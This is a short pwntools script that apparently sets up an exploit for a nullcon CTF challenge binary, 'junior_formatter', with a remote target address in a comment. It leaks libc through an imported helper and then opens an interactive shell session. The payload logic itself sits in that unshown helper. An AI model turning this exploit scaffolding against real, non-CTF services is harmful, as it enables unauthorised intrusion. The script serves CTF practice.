from pwn import *
import formal_pledge

def start():
    if args.GDB:
        return gdb.debug([exe], gdbinit, aslr=False)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    return process([exe], aslr=False)

gdbinit = '''
init-pwndbg
break *0x000055555555541c
'''

def get_libc_send_payload(payload):
    p = start()
    p.recvuntil(b'>> ')
    p.sendline(payload)
    p.recvline()
    resp = p.recvline()
    return resp, p

# binary from https://ctf.nullcon.net/challenges
exe = './junior_formatter'
elff = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

# REMOTE 52.59.124.14 5031 
formal_pledge.getlibc.run(get_libc_send_payload, elff)

p = start()
p.interactive()